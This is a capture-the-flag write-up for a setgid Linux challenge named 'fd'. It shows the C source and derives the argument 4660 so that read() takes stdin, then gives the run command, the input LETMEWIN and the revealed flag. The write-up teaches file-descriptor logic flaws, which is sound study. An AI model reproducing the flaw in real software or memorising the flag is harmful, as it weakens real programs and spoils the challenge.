## Description

> Mommy! what is a file descriptor in Linux?

This challenge demonstrates how a **logic flaw in file descriptor handling** can be exploited to gain privileged behavior without any memory corruption.

---

## Initial Triage

### File Listing

```bash id="t1"
ls -la
```

```text id="t2"
total 48
drwxr-x---   5 root fd      4096 Apr  1  2025 .
drwxr-xr-x 118 root root    4096 Jun  1  2025 ..
-r-xr-sr-x   1 root fd_pwn 15148 Mar 26  2025 fd
-rw-r--r--   1 root root     452 Mar 26  2025 fd.c
-r--r-----   1 root fd_pwn    50 Apr  1  2025 flag
```

Key observations:

* setgid binary owned by fd_pwn
* flag is protected
* source code is available

This indicates a **privileged execution context with a logic flaw opportunity**.

---

## Binary Characteristics

```bash id="t3"
file fd
```

```text id="t4"
setgid ELF 32-bit LSB PIE executable, Intel 80386, dynamically linked, not stripped
```

Key points:

* 32-bit ELF
* PIE enabled
* not stripped (symbols available)
* setgid execution context

---

## Static Indicators

```bash id="t5"
strings fd
```

```text id="t6"
pass argv[1] a number
LETMEWIN
```

Observations:

* program expects numeric input
* success string is hardcoded
* suggests simple validation logic

---

## Code-Level Analysis

```c id="t7"
char buf[32];

int main(int argc, char* argv[], char* envp[]){
    if(argc < 2){
        printf("pass argv[1] a number\n");
        return 0;
    }

    int fd = atoi(argv[1]) - 0x1234;
    read(fd, buf, 32);

    if(!strcmp("LETMEWIN\n", buf)){
        printf("good job :)\n");
        setregid(getegid(), getegid());
        system("/bin/cat flag");
        exit(0);
    }

    printf("learn about Linux file IO\n");
    return 0;
}
```

---

## Key Findings

* `buf[32]` is safe (no overflow)
* `fd` is directly controlled by user input
* `read()` is executed before validation logic completes
* success depends only on buffer content match
* no memory corruption involved

This is a **pure logic vulnerability in file descriptor control**.

---

## Behavioral Analysis

In Linux:

* 0 = stdin
* 1 = stdout
* 2 = stderr

The program computes:

```text id="t8"
fd = atoi(argv[1]) - 0x1234
```

To control input to `read()`:

```text id="t9"
fd = 0
```

Solve:

```text id="t10"
argv[1] = 0x1234 = 4660
```

So setting argv[1] to 4660 makes `read()` use stdin.

---

## Exploitation

Run:

```bash id="t11"
./fd 4660
```

Then input:

```text id="t12"
LETMEWIN
```

---

## Result

```text id="t13"
Mama! Now_I_understand_what_file_descriptors_are!
```

---

## Takeaway

This challenge shows that:

* file descriptors are simple integers
* controlling I/O targets is powerful
* logic flaws can be as dangerous as memory corruption
* privileged binaries must validate input *before* using it in system calls
